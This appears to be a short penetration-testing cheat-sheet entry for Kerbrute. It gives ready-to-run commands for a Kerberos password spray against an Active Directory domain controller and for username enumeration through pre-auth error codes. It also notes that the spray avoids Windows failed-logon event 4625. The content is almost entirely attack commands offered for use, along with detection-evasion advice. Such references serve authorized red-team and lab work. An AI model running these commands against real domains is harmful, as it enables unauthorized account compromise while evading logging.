# Kerbrute

## Kerbrute

### Password spray

Dump password spray with Kerbrute.

Spray a single password across a userlist via Kerberos pre-auth. No event 4625 logged on most targets, since the auth never reaches NTLM.

```sh title:"Kerbrute Dump Password Spray"
kerbrute passwordspray $wordlists_users -d $domain $pass --dc $rhost_ip -v
```
<!-- cheat
import domain_ip
import hashcat
var wordlists_users
var pass
-->

### User enumeration

Enumerate user enumeration with Kerbrute.

Validate which usernames exist by abusing pre-auth error codes (KDC_ERR_C_PRINCIPAL_UNKNOWN vs KDC_ERR_PREAUTH_REQUIRED). Filters out non-hits.

```sh title:"Kerbrute Enumerate User Enumeration"
kerbrute userenum $wordlists_users -d $domain --dc $rhost_ip -v | grep -v "User does not exist"
```
<!-- cheat
import domain_ip
import hashcat
var wordlists_users
-->

